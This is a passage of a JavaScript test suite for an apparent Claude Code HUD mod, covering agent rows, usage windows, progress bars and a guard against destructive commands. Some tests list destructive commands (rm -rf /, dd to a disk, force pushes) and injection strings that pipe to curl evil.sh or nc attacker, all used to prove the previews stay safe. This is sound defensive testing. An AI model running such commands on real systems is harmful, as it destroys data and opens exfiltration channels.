    let agents = spawned([], { agentId: 'a1' });
    agents = merge(agents, [{ id: 'a1', status: 'completed' }]);
    expect(agents[0].status).toBe('completed');
    expect(agents[0].finishedAt !== null).toBe(true);
});

test('an agent only the list knows about is still shown', async () => {
    // Missing one that is plainly running is worse than showing one the
    // events did not catch.
    const agents = merge([], [{ id: 'z9', status: 'running', subagent_type: 'explore' }]);
    expect(agents.length).toBe(1);
    expect(agents[0].name).toBe('explore');
});

test('a finished agent lingers, then goes', async () => {
    const now = Date.now();
    const agents = [{ id: 'a1', status: 'completed', finishedAt: now - 1000, startedAt: now - 9000, tokens: 1 }];
    expect(visible(agents, now).length).toBe(1);
    expect(visible(agents, now + LINGER_MS).length).toBe(0);
    expect(prune(agents, now + LINGER_MS).length).toBe(0);
});

test('a running agent is never pruned, however long it runs', async () => {
    const old = { id: 'a1', status: 'running', finishedAt: null, startedAt: 0, tokens: 0 };
    expect(prune([old], Date.now()).length).toBe(1);
});

test('shares add up to the whole, and are zero before anything is spent', async () => {
    const out = shares([{ tokens: 300 }, { tokens: 100 }]);
    expect(Math.round(out[0] * 100)).toBe(75);
    expect(Math.round(out[1] * 100)).toBe(25);
    expect(shares([{ tokens: 0 }, { tokens: 0 }])).toEqual([0, 0]);
    expect(shares([])).toEqual([]);
});

test('elapsed and token counts stay short enough for a row', async () => {
    const now = Date.now();
    expect(elapsedText(now - 18000, now)).toBe('18s');
    expect(elapsedText(now - 125000, now)).toBe('2m5s');
    expect(elapsedText(now - 3720000, now)).toBe('1h2m');
    expect(tokenText(950)).toBe('950');
    expect(tokenText(4100)).toBe('4.1k');
    expect(tokenText(1200000)).toBe('1.2m');
});

test('status drives the colour, and failure is loud', async () => {
    expect(statusColor('running')).toBe('green');
    expect(statusColor('waiting')).toBe('yellow');
    expect(statusColor('failed')).toBe('red');
    expect(statusColor('killed')).toBe('red');
    expect(statusColor('completed')).toBe(undefined);
});

// ================================================================ blast radius

test('the destructive shapes are recognised', async () => {
    expect(assess('rm -rf build').kind).toBe('rm');
    expect(assess('rm -fr build').kind).toBe('rm');
    expect(assess('git reset --hard').kind).toBe('git-reset');
    expect(assess('git clean -fd').kind).toBe('git-clean');
    expect(assess('git push --force origin main').kind).toBe('git-force-push');
    expect(assess('git push -f').kind).toBe('git-force-push');
    expect(assess('DROP TABLE users;').kind).toBe('sql-drop');
    expect(assess('dd if=/dev/zero of=/dev/sda').kind).toBe('disk');
});

test('ordinary commands are left entirely alone', async () => {
    const safe = ['ls -la', 'npm install', 'rm file.txt', 'git status',
        'git push origin main', 'cat README.md', '', null];
    for (const command of safe) {
        expect(assess(command)).toBe(null);
    }
});

test('force-with-lease is not a force push, and must not be treated as one', async () => {
    // It is the safe form. Interrupting it would train you to ignore the box.
    expect(assess('git push --force-with-lease')).toBe(null);
    expect(assess('git push --force-with-lease origin main')).toBe(null);
});

test('a command that builds its own arguments is not guessed at', async () => {
    // Measuring the wrong thing is worse than measuring nothing.
    expect(assess('rm -rf $(cat list)')).toBe(null);
    expect(assess('find . -name "*.o" | xargs rm -rf')).toBe(null);
});

test('a catastrophic target is marked as one', async () => {
    expect(assess('rm -rf /').precious).toBe(true);
    expect(assess('rm -rf ~').precious).toBe(true);
    expect(assess('rm -rf .').precious).toBe(true);
    expect(assess('rm -rf build').precious).toBe(false);
    expect(/read it twice/i.test(warningFor(assess('rm -rf /')))).toBe(true);
    expect(warningFor(assess('rm -rf build'))).toBe('');
});

test('a path with shell characters in it is not measured', async () => {
    expect(firstPath('a;rm')).toBe(null);
    expect(firstPath('*')).toBe(null);
    expect(firstPath('-rf build')).toBe('build');
});

test('every preview is argv, with a fixed verb and no shell', async () => {
    // This is the whole security property of the file.
    const commands = ['rm -rf build', 'git reset --hard', 'git clean -fd', 'git push --force'];
    for (const command of commands) {
        const preview = previewFor(assess(command));
        expect(Array.isArray(preview.argv)).toBe(true);
        expect(['find', 'git'].indexOf(preview.argv[0]) >= 0).toBe(true);
        for (const arg of preview.argv) {
            expect(typeof arg).toBe('string');
        }
    }
});

test('a target with a space travels as one argument, not as shell text', async () => {
    const preview = previewFor({ kind: 'rm', target: 'my dir', precious: false });
    expect(preview.argv).toEqual(['find', 'my dir', '-type', 'f']);
});

test('the kinds with no safe measurement return no preview', async () => {
    expect(previewFor({ kind: 'sql-drop' })).toBe(null);
    expect(previewFor({ kind: 'disk' })).toBe(null);
    expect(previewFor(null)).toBe(null);
});

test('counting is counting lines, and empty output is zero', async () => {
    expect(countLines('a\nb\nc')).toBe(3);
    expect(countLines('')).toBe(0);
    expect(countLines(null)).toBe(0);
});

test('the question leads with the number', async () => {
    const many = describe(assess('rm -rf build'), 1240);
    expect(/1,240 files/.test(many)).toBe(true);
    expect(/build/.test(many)).toBe(true);
    const one = describe(assess('rm -rf build'), 1);
    expect(one.indexOf('1 file ') >= 0).toBe(true);
    expect(one.indexOf('1 files') >= 0).toBe(false);
});

test('an unmeasurable command still gets an honest sentence', async () => {
    const text = describe(assess('rm -rf build'), null);
    expect(/could not be measured/.test(text)).toBe(true);
    expect(/null/.test(text)).toBe(false);
});

test('each kind says what it actually destroys', async () => {
    expect(/uncommitted/.test(describe(assess('git reset --hard'), 4))).toBe(true);
    expect(/untracked/.test(describe(assess('git clean -fd'), 7))).toBe(true);
    expect(/overwrites the remote/.test(describe(assess('git push -f'), 2))).toBe(true);
    expect(/no undo/i.test(describe(assess('DROP TABLE t;'), null))).toBe(true);
});

// =================================================================== heads up

test('a small turn is not worth a check', async () => {
    expect(shouldCheck({ on: true, sinceLast: 9, toolCalls: 1, answer: 'done' })).toBe(false);
});

test('a big turn is, but only after enough turns have passed', async () => {
    expect(shouldCheck({ on: true, sinceLast: 1, toolCalls: 9, answer: 'x'.repeat(2000) })).toBe(false);
    expect(shouldCheck({ on: true, sinceLast: 3, toolCalls: 9, answer: '' })).toBe(true);
    expect(shouldCheck({ on: true, sinceLast: 3, toolCalls: 0, answer: 'x'.repeat(2000) })).toBe(true);
});

test('heads up off means off', async () => {
    expect(shouldCheck({ on: false, sinceLast: 99, toolCalls: 99, answer: 'x'.repeat(9999) })).toBe(false);
});

test('the conversation is flattened whatever shape the blocks are', async () => {
    const messages = [
        { role: 'user', content: 'fix the parser' },
        { role: 'assistant', content: [{ type: 'text', text: 'I changed parser.js' }, { type: 'tool_use' }] },
        { role: 'system', content: 'ignored' },
    ];
    const text = flatten(messages);
    expect(/Developer: fix the parser/.test(text)).toBe(true);
    expect(/Assistant: I changed parser\.js/.test(text)).toBe(true);
    expect(/ignored/.test(text)).toBe(false);
});

test('a short conversation is not worth sending', async () => {
    expect(buildHeadsPrompt([{ role: 'user', content: 'hi' }])).toBe(null);
    expect(buildHeadsPrompt([])).toBe(null);
});

test('the heads-up request asks for silence by default, and says so', async () => {
    const ask = buildHeadsPrompt([{ role: 'assistant', content: 'x'.repeat(500) }]);
    expect(/NONE/.test(ask)).toBe(true);
    expect(ask.length < 3200).toBe(true);
});

test('NONE is silence, in any spelling', async () => {
    for (const quiet of ['NONE', 'none', 'None.', 'NONE - nothing to flag']) {
        expect(parseHeadsUp(quiet)).toBe(null);
    }
});

test('a real note comes through, cleaned', async () => {
    const note = parseHeadsUp('- "The retry test still asserts the old timeout."');
    expect(note).toBe('The retry test still asserts the old timeout.');
});

test('anything that is not a short concrete note is dropped', async () => {
    const bad = ['', '   ', 'Sure, here is one:', 'ok', 'Did you mean to change the timeout?',
        'x'.repeat(400), 'I think that', 'As an assistant I would say the parser changed'];
    for (const b of bad) {
        expect(parseHeadsUp(b)).toBe(null);
    }
});

test('an object reply is read as well as a string, for heads up', async () => {
    const note = parseHeadsUp({ text: 'The migration drops a column the report still reads.' });
    expect(note).toBe('The migration drops a column the report still reads.');
});

// ===================================== the preview cannot be turned into a weapon
//
// This is the only part of the mod that starts a process, so it is the only
// part where a mistake is a security bug rather than a cosmetic one. Each
// test below is an attack, not a feature.

/** Every argv a command would produce, or null. */
const argvFor = (command) => {
    const found = assess(command);
    if (!found) return null;
    const preview = previewFor(found);
    return preview ? preview.argv : null;
};

test('a target cannot turn find into a destructive command', async () => {
    // `find -delete` deletes. If a target starting with a dash reached the
    // argv, the preview would destroy the thing it was asked to measure.
    const attacks = ['rm -rf -delete', 'rm -rf -exec rm {} ;', 'rm -rf --delete',
        'rm -rf -newer /etc/passwd -delete'];
    for (const attack of attacks) {
        const argv = argvFor(attack);
        if (!argv) continue;
        expect(argv.indexOf('-delete') >= 0).toBe(false);
        expect(argv.indexOf('-exec') >= 0).toBe(false);
    }
});

test('no preview argv ever contains an action, only a test', async () => {
    const acting = ['-delete', '-exec', '-execdir', '-ok', '-okdir', '-fls', '-fprint', '-fprintf'];
    const commands = ['rm -rf build', 'rm -rf /', 'rm -rf a/b/c', 'git reset --hard',
        'git clean -fd', 'git push --force'];
    for (const command of commands) {
        const argv = argvFor(command) || [];
        for (const bad of acting) {
            expect(argv.indexOf(bad) >= 0).toBe(false);
        }
    }
});

test('shell metacharacters never reach an argv', async () => {
    const attacks = [
        'rm -rf build;curl evil.sh|sh',
        'rm -rf build && curl evil',
        'rm -rf build|nc attacker 1234',
        'rm -rf $(whoami)',
        'rm -rf "a b"',
        'rm -rf build>out',
        'rm -rf *',
        'rm -rf {a,b}',
    ];
    for (const attack of attacks) {
        const argv = argvFor(attack);
        if (argv === null) continue;
        for (const arg of argv) {
            expect(/[;&|<>$`(){}*?!\\'"]/.test(arg)).toBe(false);
        }
    }
});

test('the verb of a preview can never come from the command text', async () => {
    const argv = argvFor('rm -rf curl');
    expect(argv[0]).toBe('find');
    expect(argv).toEqual(['find', 'curl', '-type', 'f']);
});

test('git previews take no argument from the command at all', async () => {
    const commands = ['git reset --hard origin/evil', 'git clean -fd /etc',
        'git push --force git@evil:repo main'];
    for (const command of commands) {
        const argv = argvFor(command);
        expect(argv.every((a) => a.indexOf('evil') === -1)).toBe(true);
    }
});

test('an absurd path cannot change the shape of the argv', async () => {
    const attacks = ['rm -rf ' + 'a'.repeat(5000), 'rm -rf ./././././build'];
    for (const attack of attacks) {
        const argv = argvFor(attack);
        if (!argv) continue;
        expect(argv.length).toBe(4);
        expect(argv[0]).toBe('find');
        expect(typeof argv[1]).toBe('string');
    }
});

test('firstPath refuses anything it cannot read plainly', async () => {
    const bad = ['"a b"', "'a'", 'a;b', 'a|b', 'a&b', 'a>b', 'a<b', 'a*b', 'a?b',
        'a(b)', 'a{b}', 'a!b', ''];
    for (const text of bad) {
        expect(firstPath(text)).toBe(null);
    }
    expect(firstPath('-rf -v build extra')).toBe('build');
});

test('an empty or absent target produces no preview at all', async () => {
    expect(assess('rm -rf')).toBe(null);
    expect(assess('rm -rf   ')).toBe(null);
    expect(assess('rm -rf -v')).toBe(null);
});

// ================================================= the mod actually loads
//
// This is the test that was missing, and its absence shipped a mod that
// could not load at all: a duplicate import made `register.js` throw on
// import, which looks exactly like the plugin not being installed. Every
// other test here checks a part; this one checks that the thing starts.

test('the hooks module loads and registers its hooks', async () => {
    const registered = [];

    const on = (event, a, b) => {
        const matcher = typeof a === 'function' ? null : a;
        const handler = typeof a === 'function' ? a : b;
        expect(typeof event).toBe('string');
        expect(typeof handler).toBe('function');
        registered.push({ event, matcher });
        // The real `on` returns a registration carrying `.catch`.
        return { catch: () => undefined };
    };

    const mod = await import('../hooks/register.js');
    expect(typeof mod.register).toBe('function');
    mod.register(on);

    // Every hook the mod needs, by name.
    const events = registered.map((r) => r.event);
    for (const needed of ['session.start', 'session.measure', 'prompt.submit', 'turn.complete',
        'turn.step', 'agent.spawn', 'tool.call', 'classic.PreModelSwitch',
        'command.run', 'ui.render']) {
        expect(events.indexOf(needed) >= 0).toBe(true);
    }
});

test('no event is registered twice without a matcher', async () => {
    // Claude Code refuses to load a module that does, and the failure is
    // the whole mod rather than the one hook.
    const bare = [];

    const on = (event, a) => {
        if (typeof a === 'function') bare.push(event);
        return { catch: () => undefined };
    };

    const mod = await import('../hooks/register.js');
    mod.register(on);

    const seen = new Set();
    for (const event of bare) {
        expect(seen.has(event)).toBe(false);
        seen.add(event);
    }
});

test('the gating hook has a catch handler, so a bug in it fails open', async () => {
    // A tool.call hook that throws without one would leave Claude Code to
    // decide, and a guard that breaks your work is worse than no guard.
    let gatedHasCatch = false;

    const on = (event, a, b) => {
        const isGate = event === 'tool.call';
        return {
            catch: (fn) => {
                if (isGate && typeof fn === 'function') gatedHasCatch = true;
                return undefined;
            },
        };
    };

    const mod = await import('../hooks/register.js');
    mod.register(on);
    expect(gatedHasCatch).toBe(true);
});

// ================================================ the separate Fable window
//
// The usage panel on the website shows three allowances: the session, the
// week, and a weekly one for Fable on its own. Claude Code reports only the
// first two to mods, so the third cannot be drawn - and the strip going quiet
// about it looks exactly like the strip being broken.
//
// These cover both halves: that nothing is silently dropped when it does
// arrive, and that its absence is stated rather than hidden.

test('a Fable window is read like any other when it is reported', async () => {
    const read = readUsage({
        rateLimits: [
            { kind: 'five_hour', percentUsed: 22, resetsAt: 1700000000 },
            { kind: 'seven_day', percentUsed: 67, resetsAt: 1700600000 },
            { kind: 'seven_day_fable', percentUsed: 4, resetsAt: 1700600000 },
        ],
    });
    expect(read.rateLimits.length).toBe(3);
    expect(read.rateLimits[2].kind).toBe('seven_day_fable');
    expect(read.rateLimits[2].percentUsed).toBe(4);
    // The reset has to survive too, or it draws a bar with no countdown.
    expect(read.rateLimits[2].resetsAt).toBe(1700600000);
});

test('and it is labelled Fable, not dropped for being unfamiliar', async () => {
    // The list of kinds is not documented, so anything unrecognised is
    // tidied rather than discarded: a limit nobody shows you is how you run
    // out of something you did not know you had.
    expect(shortKind('seven_day_fable')).toBe('Fable');
    expect(shortKind('fable_weekly')).toBe('Fable');
    expect(shortKind('seven_day_opus')).toBe('Opus');
});

test('the readout notices when no Fable window came back', async () => {
    expect(hasFableWindow([{ kind: 'five_hour' }, { kind: 'seven_day' }])).toBe(false);
    expect(hasFableWindow([{ kind: 'seven_day_fable' }])).toBe(true);
    expect(hasFableWindow([])).toBe(false);
});

test('/hud raw says Fable is absent rather than leaving it a mystery', async () => {
    const lines = describeUsage({
        context: { tokens: 1, window: 2, percent: 33 },
        rateLimits: [
            { kind: 'five_hour', percentUsed: 26, resetsAt: 1700000000 },
            { kind: 'seven_day', percentUsed: 67, resetsAt: 1700600000 },
        ],
    }).join('\n');
    expect(lines.includes('no Fable window in this data')).toBe(true);
    // And it names every window, so the answer is visible rather than
    // inferred from a count.
    expect(lines.includes('kinds: five_hour, seven_day')).toBe(true);
});

test('and says nothing about it once it is there', async () => {
    const lines = describeUsage({
        rateLimits: [
            { kind: 'five_hour', percentUsed: 26, resetsAt: 1700000000 },
            { kind: 'seven_day_fable', percentUsed: 4, resetsAt: 1700600000 },
        ],
    }).join('\n');
    expect(lines.includes('no Fable window in this data')).toBe(false);
});

// ========================================= the subagent bar means a share
//
// It is each agent's portion of the tokens spent across all of them. With one
// agent that is always the whole thing, so the bar was always full - drawn in
// the same language as the quota bars above it, where full means spent. The
// row read as an agent that had maxed something out when it only meant there
// was nothing to compare it with.

test('one agent is the whole of the agent tokens, by definition', async () => {
    const one = [{ id: 'a', tokens: 1700000 }];
    expect(shares(one)[0]).toBe(1);
});

test('which is why a lone agent is not given a bar', async () => {
    // The strip's own rule, not a copy of it written here.
    expect(comparable([{ id: 'a' }])).toBe(false);
    expect(comparable([{ id: 'a' }, { id: 'b' }])).toBe(true);
    expect(comparable([])).toBe(false);
    expect(comparable(undefined)).toBe(false);
});

test('two agents split it, and the bar starts meaning something', async () => {
    const two = [{ id: 'a', tokens: 750 }, { id: 'b', tokens: 250 }];
    const portions = shares(two);
    expect(portions[0]).toBe(0.75);
    expect(portions[1]).toBe(0.25);
});

// ============================================== what the strip makes of it
//
// Every reading stays on screen; only the weight changes. These cover the
// rule that decides that weight, and the one that decides whether the mod
// needs a timer running at all.

test('a reading earns its weight from the same thresholds as its colour', async () => {
    expect(levelOf(0)).toBe(CALM);
    expect(levelOf(55)).toBe(CALM);
    expect(levelOf(56)).toBe(WATCH);
    expect(levelOf(85)).toBe(WATCH);
    expect(levelOf(86)).toBe(URGENT);
    expect(levelOf(100)).toBe(URGENT);
});

test('a rounding case lands on the same side as the printed number', async () => {
    // 55.6 prints as 56, so it must not still be calm.
    expect(levelOf(55.6)).toBe(WATCH);
    expect(levelOf(85.7)).toBe(URGENT);
});

test('the dot reports the worst thing on the strip', async () => {
    expect(worstLevel([{ level: CALM }, { level: CALM }])).toBe(CALM);
    expect(worstLevel([{ level: CALM }, { level: WATCH }])).toBe(WATCH);
    expect(worstLevel([{ level: WATCH }, { level: URGENT }])).toBe(URGENT);
    expect(worstLevel([])).toBe(CALM);
});

test('a reset far out is a time of day, one close is a countdown', async () => {
    const now = 1700000000000;
    const inMinutes = (m) => (now + m * 60000) / 1000;
    expect(resetFormFor(inMinutes(30), now)).toBe('countdown');
    expect(resetFormFor(inMinutes(119), now)).toBe('countdown');
    expect(resetFormFor(inMinutes(121), now)).toBe('clock');
    expect(resetFormFor(inMinutes(60 * 40), now)).toBe('clock');
    expect(resetFormFor(null, now)).toBe('none');
    // Already gone: nothing to count down to.
    expect(resetFormFor(inMinutes(-5), now)).toBe('none');
});

test('the per-minute redraw runs only while something counts down', async () => {
    // This is the whole saving. The strip used to redraw every minute from
    // startup to shutdown whether or not anything on it changed.
    expect(needsClock([{ resetForm: 'clock' }, { resetForm: 'none' }])).toBe(false);
    expect(needsClock([{ resetForm: 'clock' }, { resetForm: 'countdown' }])).toBe(true);
    expect(needsClock([])).toBe(false);
});

test('context is a reading but never a window', async () => {
    // It has no reset and no pace: it ends when the conversation is
    // compacted, not when a clock runs out.
    const readings = readingsFor({ contextPercent: 33, rateLimits: [] });
    expect(readings.length).toBe(1);
    expect(readings[0].label).toBe('Ctx');
    expect(readings[0].resetForm).toBe('none');
    expect(readings[0].note).toBe('');
});

test('every window reported is a reading, in the order it came', async () => {
    const readings = readingsFor({
        contextPercent: 15,
        rateLimits: [
            { kind: 'five_hour', percentUsed: 2, resetsAt: 1700000000 },
            { kind: 'seven_day', percentUsed: 64, resetsAt: 1700600000 },
            { kind: 'seven_day_fable', percentUsed: 4, resetsAt: 1700600000 },
        ],
        labelOf: shortKind,
    });
    expect(readings.map((r) => r.label).join(',')).toBe('Ctx,Session,Week,Fable');
});

test('a spend limit is still left out, since it is not a quota', async () => {
    const readings = readingsFor({
        rateLimits: [{ kind: 'spend_limit', percentUsed: 80 }],
        labelOf: shortKind,
    });
    expect(readings.length).toBe(0);
});

test('only one note is ever spoken, and it is the most pressing', async () => {
    const pick = leadNote([
        { label: 'Week', level: WATCH, note: 'slow', pace: { dryInMinutes: 900 } },
        { label: 'Session', level: URGENT, note: 'fast', pace: { dryInMinutes: 30 } },
    ]);
    expect(pick.label).toBe('Session');
    expect(leadNote([{ label: 'Week', level: CALM, note: '' }])).toBe(null);
    expect(leadNote([])).toBe(null);
});

// ====================================================== the progress bar
//
// The denominator comes from the todo list, which is written before the work
// starts and updated as each item lands. Nothing here is invented.

test('the plan is found whatever the event calls it', async () => {
    const list = [{ content: 'a', status: 'completed' }];
    expect(todosFrom({ todos: list }).length).toBe(1);
    expect(todosFrom({ input: { todos: list } }).length).toBe(1);
    expect(todosFrom({ args: { todos: list } }).length).toBe(1);
    expect(todosFrom({ parameters: { items: list } }).length).toBe(1);
    expect(todosFrom({}).length).toBe(0);
    expect(todosFrom(null).length).toBe(0);
});

test('one todo is not a plan', async () => {
    // A bar reading 0/1 on every small question is noise.
    expect(progressOf([{ content: 'a', status: 'pending' }])).toBe(null);
    expect(progressOf([])).toBe(null);
    expect(MIN_PLAN).toBe(2);
});

test('finished and in hand are counted apart', async () => {
    const plan = progressOf([
        { content: 'one', status: 'completed' },
        { content: 'two', status: 'completed' },
        { activeForm: 'Building the sidebar', status: 'in_progress' },
        { content: 'four', status: 'pending' },
    ]);
    expect(plan.total).toBe(4);
    expect(plan.done).toBe(2);
    expect(plan.doing).toBe(1);
    // The bar reaches the end when the work does, not when the last item is
    // picked up - so the solid layer counts only what is finished.
    expect(plan.donePercent).toBe(50);
    expect(plan.reachedPercent).toBe(75);
    expect(plan.label).toBe('Building the sidebar');
    expect(countText(plan)).toBe('2/4');
});

test('the item in hand names the bar', async () => {
    const plan = progressOf([
        { content: 'done thing', status: 'completed' },
        { activeForm: 'Wiring the panel', content: 'Wire the panel', status: 'in_progress' },
    ]);
    expect(plan.label).toBe('Wiring the panel');
});

test('a finished plan stops being drawn', async () => {
    const done = progressOf([
        { content: 'one', status: 'completed' },
        { content: 'two', status: 'completed' },
    ]);
    expect(done.complete).toBe(true);
    expect(worthShowing(done)).toBe(false);
    expect(worthShowing(null)).toBe(false);
});

test('a plan still running is drawn', async () => {
    const plan = progressOf([
        { content: 'one', status: 'completed' },
        { content: 'two', status: 'pending' },
    ]);
    expect(worthShowing(plan)).toBe(true);
    expect(plan.percent).toBe(50);
});

test('an unfamiliar status counts as not started rather than breaking', async () => {
    const plan = progressOf([
        { content: 'one', status: 'queued' },
        { content: 'two', status: 'completed' },
    ]);
    expect(plan.done).toBe(1);
    expect(plan.doing).toBe(0);
});

test('the terminal bar is blue, two weights, and exactly as wide as asked', async () => {
    const plan = progressOf([
        { content: 'a', status: 'completed' },
        { content: 'b', status: 'in_progress' },
        { content: 'c', status: 'pending' },
        { content: 'd', status: 'pending' },
    ]);
    const pieces = planBar(plan, false, 16);
    const text = pieces.map((x) => x.text).join('');
    expect(text.length).toBe(16);
    expect(text.startsWith('[')).toBe(true);
    expect(text.endsWith(']')).toBe(true);
    // Never the quota colours: progress is not a limit.
    const colors = pieces.map((x) => x.color).filter(Boolean);
    expect(colors.every((c) => c === 'blue')).toBe(true);
});

test('the first item of a long plan still shows as something begun', async () => {
    const todos = [{ content: 'a', status: 'completed' }];
    for (let i = 0; i < 19; i += 1) todos.push({ content: 'x' + i, status: 'pending' });
    const pieces = planBar(progressOf(todos), false, 16);
    const solid = pieces.find((x) => x.color === 'blue' && !x.dim);
    expect(!!solid).toBe(true);
});

test('an empty plan draws an empty track, not a broken bar', async () => {
    const pieces = planBar(null, false, 16);
    expect(pieces.map((x) => x.text).join('').length).toBe(16);
});

// ====================================== the desktop strip holds its shape
//
// This shipped as one flat row of loose pieces. In a narrow band every piece
// shrank on its own and split mid-label: "opus 5" on two lines, "6:30 AM"
// cut at its space. The fix is structural - a Box per reading that refuses to
// shrink, in a row that wraps between them - so the test is on the tree, not
// on any one width: render the real hook and look at what it built.

async function renderDesktopStrip(rateLimits, contextPercent) {
    const hooks = [];
    const on = (event, a, b) => {
        const matcher = typeof a === 'function' ? null : a;
        const handler = typeof a === 'function' ? a : b;
        hooks.push({ event, matcher, handler });
        return { catch: () => undefined };
    };
    const mod = await import('../hooks/register.js');
    mod.register(on);

    const el = (type) => (props) => ({ type, ...props });
    const ui = {
        resolve: () => ({ Box: el('Box'), Text: el('Text'), Svg: el('Svg'), Button: el('Button') }),
        invalidate: () => undefined,
    };
    const next = async (e) => e;

    const measure = hooks.find((h) => h.event === 'session.measure');
    await measure.handler({
        session: { usage: async () => ({ context: { percent: contextPercent }, rateLimits }) },
        ui,
    }, {}, next);

    // The band, by name: there is a second ui.render hook now, the sidebar's,
    // and asking for "the" render hook would hand back whichever came first.
    const render = hooks.find((h) => h.event === 'ui.render' && h.matcher && h.matcher.component === 'AbovePrompt');
    return render.handler({
        ui,
        session: { model: async () => 'claude-opus-5-5' },
        clock: { after: () => undefined, every: () => undefined },
    }, { surface: 'desktop', component: 'AbovePrompt' }, async () => null);
}

const soon = () => Math.floor(Date.now() / 1000) + 3 * 3600;
const later = () => Math.floor(Date.now() / 1000) + 40 * 3600;

test('the desktop strip wraps between readings instead of inside them', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 71);
    expect(tree.type).toBe('Box');
    expect(tree.flexWrap).toBe('wrap');
});

test('and the desktop strip never tears a reading', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 71);
    // Every child of the wrapping row is a whole group, and none may shrink.
    // A bare Text here is the old bug: a loose piece free to split.
    expect(tree.children.length >= 4).toBe(true);
    for (const child of tree.children) {
        expect(child.type).toBe('Box');
        expect(child.flexShrink).toBe(0);
    }
});

test('a reading keeps its label, number and reset together in one group', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
    ], 10);
    const session = tree.children.find((c) => c.key === 'rdsession');
    expect(!!session).toBe(true);
    const kinds = session.children.map((c) => c.key);
    expect(kinds.indexOf('lsession') >= 0).toBe(true);
    expect(kinds.indexOf('psession') >= 0).toBe(true);
    expect(kinds.indexOf('rsession') >= 0).toBe(true);
});

test('no text on the desktop strip is left free to wrap mid-word', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 71);
    for (const group of tree.children) {
        for (const part of group.children) {
            if (part.type === 'Text') expect(part.wrap).toBe('truncate');
        }
    }
});

test('a calm reading spends no gauge and a busy one does', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 2, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 10);
    const has = (key) => tree.children.find((c) => c.key === key).children.some((p) => p.type === 'Svg');
    expect(has('rdsession')).toBe(false);
    expect(has('rdweek')).toBe(true);
});

// ================================== the question is asked once, not forever
//
// At 90% of the window the mod asks how to proceed with expensive work. It
// asked again on every prompt afterwards, at 95%, 97%, 97% and 97%, because
// nothing remembered the answer. One decision per window is the contract.

async function promptsAt(percent, answers, count, beforePrompts) {
    const hooks = [];
    const on = (event, a, b) => {
        hooks.push({ event, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = await import('../hooks/register.js');
    mod.register(on);

    const asked = [];
    const ui = {
        invalidate: () => undefined,
        ask: async (q, options) => { asked.push(options); return answers.shift(); },
    };
    const next = async (e) => e;
    const soon = Math.floor(Date.now() / 1000) + 3600;

    const measure = async (pct) => hooks.find((h) => h.event === 'session.measure').handler({
        session: { usage: async () => ({ rateLimits: [{ kind: 'five_hour', percentUsed: pct, resetsAt: soon }] }) },
        ui,
    }, {}, next);
    const submit = hooks.find((h) => h.event === 'prompt.submit');
    const ctx = {
        ui,
        session: { model: async () => 'claude-opus-5-5', messages: async () => [] },
        clock: { after: () => undefined, every: () => undefined },
    };

    // A window that has reset forgets the last answer. Doing that first is
    // also what keeps these tests from leaning on each other, since the
    // module's state outlives a single test.
    await measure(5);
    await submit.handler(ctx, { text: 'fix a typo' }, next);
    asked.length = 0;

    await measure(percent);
    if (beforePrompts) await beforePrompts(hooks, ctx);
    for (let i = 0; i < count; i += 1) {
        await submit.handler({
            ui,
            session: { model: async () => 'claude-opus-5-5', messages: async () => [] },
            clock: { after: () => undefined, every: () => undefined },
        }, { text: 'plan the whole migration and refactor the architecture' }, next);
    }
    return asked.length;
}

test('it asks about the nearly-full window once, however many prompts follow', async () => {
    expect(await promptsAt(92, ['Use opus 5.5', 'Use opus 5.5', 'Use opus 5.5', 'Use opus 5.5'], 4)).toBe(1);
});

test('and a typed answer counts as an answer rather than a reason to ask again', async () => {
    expect(await promptsAt(97, ['use fable if it can finish, otherwise opus', 'x', 'x'], 3)).toBe(1);
});

test('/hud confirm off stops the question for good', async () => {
    const off = async (hooks, ctx) => {
        const cmd = hooks.find((h) => h.event === 'command.run');
        const reply = await cmd.handler(ctx, { args: 'confirm off' });
        expect(reply.text.includes('No more questions')).toBe(true);
    };
    expect(await promptsAt(96, ['x', 'x', 'x'], 3, off)).toBe(0);
});

test('and /hud confirm on brings it back, once', async () => {
    const cycle = async (hooks, ctx) => {
        const cmd = hooks.find((h) => h.event === 'command.run');
        await cmd.handler(ctx, { args: 'confirm off' });
        await cmd.handler(ctx, { args: 'confirm on' });
    };
    expect(await promptsAt(96, ['Use opus 5.5', 'x', 'x'], 3, cycle)).toBe(1);
});

// ============================================== what you set stays set
//
// Nothing the mod was told survived a restart: the switches went back to on
// the next session, and the README said they stuck. These cover the store
// round trip, and that a store that misbehaves can never break a session.

async function hudWith(store) {
    const hooks = [];
    const on = (event, a, b) => {
        hooks.push({ event, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = await import('../hooks/register.js');
    mod.register(on);
    const ctx = {
        store,
        ui: { invalidate: () => undefined },
        command: { register: async () => undefined },
        session: { usage: async () => ({}), model: async () => 'claude-opus-5-5' },
        clock: { after: () => undefined, every: () => undefined },
    };
    const next = async (e) => e;

    // Module state outlives a single test, so every test begins from a known
    // baseline: all four switches on, loaded the way a fresh session loads
    // them. Without this a test can pass because an earlier one left things
    // as it wanted them, which proves nothing.
    ctx.store = memoryStore({ prefs: { suggestOn: true, headsOn: true, blastOn: true, confirmOn: true } });
    await hooks.find((h) => h.event === 'session.start').handler(ctx, {}, next);
    ctx.store = store;

    return {
        start: () => hooks.find((h) => h.event === 'session.start').handler(ctx, {}, next),
        say: (args) => hooks.find((h) => h.event === 'command.run').handler(ctx, { args }),
    };
}

function memoryStore(initial) {
    const data = new Map(Object.entries(initial || {}));
    const writes = [];
    return {
        data, writes,
        get: async (k) => data.get(k),
        set: async (k, v) => { writes.push([k, v]); data.set(k, JSON.parse(JSON.stringify(v))); },
    };
}

test('a switch you turn off is saved', async () => {
    const store = memoryStore();
    const hud = await hudWith(store);
    await hud.start();
    await hud.say('confirm on');   // a known starting point
    store.writes.length = 0;
